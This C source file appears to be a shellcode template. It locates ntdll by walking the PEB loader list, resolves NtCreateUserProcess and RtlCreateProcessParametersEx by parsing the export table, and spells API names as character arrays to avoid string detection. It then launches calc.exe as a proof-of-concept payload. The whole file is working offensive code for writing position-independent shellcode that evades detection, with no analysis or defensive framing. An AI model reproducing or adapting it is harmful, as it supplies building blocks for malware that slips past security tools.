#include "shellcode.h"
#include "ntdll.h"


BOOLEAN
strcmpAAi(
    IN const char* str1,
    IN const char* str2
) {
    while (*str1 && *str2) {
        char c1 = (*str1 >= 'A' && *str1 <= 'Z') ? *str1 + 32 : *str1;
        char c2 = (*str2 >= 'A' && *str2 <= 'Z') ? *str2 + 32 : *str2;
        
        if (c1 != c2) return 0;
        
        str1++;
        str2++;
    }
    return *str1 == *str2;
}

ADDR MyGetNTDLLProcAddress(
    IN const char* lpProcName
){
    PEB* peb = (PEB*)__readgsqword(0x60);
    LDR_DATA_TABLE_ENTRY* head = (LDR_DATA_TABLE_ENTRY *)&(peb->Ldr->InLoadOrderModuleList);
    //empty -> ntdll
    LDR_DATA_TABLE_ENTRY* curr = (LDR_DATA_TABLE_ENTRY *)head->InLoadOrderLinks.Flink;
    curr = (LDR_DATA_TABLE_ENTRY *)curr->InLoadOrderLinks.Flink;

    ADDR baseAddr = (ADDR) curr->DllBase;
    if(baseAddr == 0) return 0;


    IMAGE_DATA_DIRECTORY *exportData = EXPORT_DIRECTORY(baseAddr);
    IMAGE_EXPORT_DIRECTORY *exportDirectory = (IMAGE_EXPORT_DIRECTORY *)((unsigned char *)baseAddr + exportData->VirtualAddress);
    USHORT ordinal = 0;
    DWORD *exportedFunctions = (DWORD *)((unsigned char *)baseAddr + exportDirectory->AddressOfFunctions);
    if ((ULONG_PTR)lpProcName >> 16 == 0){
        // by ordinal
        ordinal = (USHORT)((ULONG_PTR)lpProcName & 0xFFFF);
    }else{
        // by name
        DWORD *exportedNamesRVA = (DWORD *)((unsigned char *)baseAddr + exportDirectory->AddressOfNames);
        WORD *nameIndexToOrdinal = (WORD *)((unsigned char *)baseAddr + exportDirectory->AddressOfNameOrdinals);
        for (int i = 0; i < exportDirectory->NumberOfNames; i++)
        {
            char *name = (char *)((unsigned char *)baseAddr + exportedNamesRVA[i]);
            if (strcmpAAi(name, lpProcName)){
                ordinal = (USHORT)(exportDirectory->Base + nameIndexToOrdinal[i]);
                break;
            }
        }
    }

    if (ordinal == 0) return 0;
    DWORD funcRVA = exportedFunctions[ordinal - exportDirectory->Base];
    return (ADDR)((unsigned char *)baseAddr + funcRVA);
}

void main(){
    typedef NTSTATUS(NTAPI *MyNtCreateUserProcess)(
        _Out_ PHANDLE ProcessHandle,
        _Out_ PHANDLE ThreadHandle,
        _In_ ACCESS_MASK ProcessDesiredAccess,
        _In_ ACCESS_MASK ThreadDesiredAccess,
        _In_opt_ POBJECT_ATTRIBUTES ProcessObjectAttributes,
        _In_opt_ POBJECT_ATTRIBUTES ThreadObjectAttributes,
        _In_ ULONG ProcessFlags,
        _In_ ULONG ThreadFlags,
        _In_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
        _Inout_ PPS_CREATE_INFO CreateInfo,
        _In_ PPS_ATTRIBUTE_LIST AttributeList
    );

    typedef NTSTATUS (NTAPI *MyRtlCreateProcessParametersEx)(
        _Out_ PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
        _In_ PUNICODE_STRING ImagePathName,
        _In_opt_ PUNICODE_STRING DllPath,
        _In_opt_ PUNICODE_STRING CurrentDirectory,
        _In_opt_ PUNICODE_STRING CommandLine,
        _In_opt_ PVOID Environment,
        _In_opt_ PUNICODE_STRING WindowTitle,
        _In_opt_ PUNICODE_STRING DesktopInfo,
        _In_opt_ PUNICODE_STRING ShellInfo,
        _In_opt_ PUNICODE_STRING RuntimeData,
        _In_ ULONG Flags
    );

    char cNtCreateUserProcess[] = {'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'U', 's', 'e', 'r', 'P', 'r', 'o', 'c', 'e', 's', 's', 0};
    char cRtlCreateProcessParametersEx[] = {'R', 't', 'l', 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'P', 'a', 'r', 'a', 'm', 'e', 't', 'e', 'r', 's', 'E', 'x', 0};
    wchar_t pathBuffer[] = {'\\', '?', '?', '\\', 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'c', 'a', 'l', 'c', '.', 'e', 'x', 'e', 0};


    MyNtCreateUserProcess myNtCreateUserProcess = (MyNtCreateUserProcess)MyGetNTDLLProcAddress(cNtCreateUserProcess);
    MyRtlCreateProcessParametersEx myRtlCreateProcessParametersEx = (MyRtlCreateProcessParametersEx)MyGetNTDLLProcAddress(cRtlCreateProcessParametersEx);

    HANDLE pHandle = NULL, tHandle = NULL;

    // wchar_t pathBuffer[] = L"\\??\\C:\\Windows\\System32\\calc.exe";
    UNICODE_STRING NtImagePath = {0};
    NtImagePath.Length = 32 * sizeof(wchar_t);  // 31 characters, each 2 bytes
    NtImagePath.MaximumLength = NtImagePath.Length + sizeof(wchar_t);  // Plus null terminator
    NtImagePath.Buffer = pathBuffer;

    // RTL_USER_PROCESS_PARAMETERS processParameters = {0};
    // processParameters.
    // Create the process parameters
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	myRtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

    PS_CREATE_INFO createInfo = {0};
    createInfo.Size = sizeof(PS_CREATE_INFO);
    createInfo.State = PsCreateInitialState;

    PS_ATTRIBUTE_LIST attributeList = {0};
    attributeList.TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
    attributeList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attributeList.Attributes[0].Size = NtImagePath.Length;
    attributeList.Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;



    NTSTATUS status = myNtCreateUserProcess(
        &pHandle,
        &tHandle,
        PROCESS_ALL_ACCESS,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        0,
        0,
        ProcessParameters,
        &createInfo,
        &attributeList
    );
}